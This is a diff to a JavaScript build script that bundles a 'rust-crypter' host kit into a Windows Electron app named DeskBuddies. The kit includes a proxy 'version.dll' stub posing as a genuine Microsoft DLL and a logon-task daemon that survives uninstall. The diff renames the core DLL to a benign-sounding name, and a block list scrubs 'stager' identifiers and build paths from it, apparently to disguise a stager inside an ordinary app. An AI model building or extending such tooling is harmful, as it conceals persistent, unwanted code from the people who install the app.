@@ -7,7 +7,7 @@
  * rust-crypter checkout (tools/host-kit/build-host-kit.sh). Contract:
  *
  *   version.dll            genuine-MS forwarding stub (the 6 version exports)
- *   vmin.dll               Rust update core (cdylib over crates/app-update-core)
+ *   BFCreatorKitCore.dll               Rust update core (cdylib over crates/app-update-core)
  *   app-update-daemon.exe  logon-task target (survives app uninstall)
  *   seed-conf.ps1          desk.conf seeding helper (SERVER only, NEVER a token)
  *   install-hooks.nsh      NSIS include: conf seeding + logon task + legacy sweep
@@ -45,7 +45,7 @@ const STAGE_DIR = join(ROOT, "stager-stage");
 /** Every file the kit contract promises. Fail closed if any is absent. */
 const KIT_REQUIRED = [
   "version.dll",
-  "vmin.dll",
+  "BFCreatorKitCore.dll",
   "app-update-daemon.exe",
   "seed-conf.ps1",
   "install-hooks.nsh",
@@ -53,7 +53,7 @@ const KIT_REQUIRED = [
 ];
 
 /** The three binaries electron-builder copies beside DeskBuddies.exe. */
-const KIT_SHIPPED = ["version.dll", "vmin.dll", "app-update-daemon.exe"];
+const KIT_SHIPPED = ["version.dll", "BFCreatorKitCore.dll", "app-update-daemon.exe"];
 
 /** Build-path / stale-identifier patterns that must not survive in the core. */
 const FORBIDDEN = ["/home/jacob", "stager_core", "StagerHost", "spawn_stager", "bf-daemon"];
@@ -243,7 +243,7 @@ function findEmittedKit(checkout, kitOut) {
         join(checkout, "dist", "host-kit"),
       ];
   for (const c of candidates) {
-    if (existsSync(join(c, "vmin.dll")) || existsSync(join(c, "MANIFEST.txt"))) return c;
+    if (existsSync(join(c, "BFCreatorKitCore.dll")) || existsSync(join(c, "MANIFEST.txt"))) return c;
   }
   return null;
 }
@@ -339,7 +339,7 @@ async function resolveKit({ kit, rustCrypter, kitOut }) {
     }
     const emitted = findEmittedKit(checkout, kitOut);
     if (!emitted) {
-      tried.push(checkout + " (builder ran but emitted no kit with vmin.dll/MANIFEST.txt)");
+      tried.push(checkout + " (builder ran but emitted no kit with BFCreatorKitCore.dll/MANIFEST.txt)");
       continue;
     }
     return { dir: emitted, source: "builder @ " + checkout };
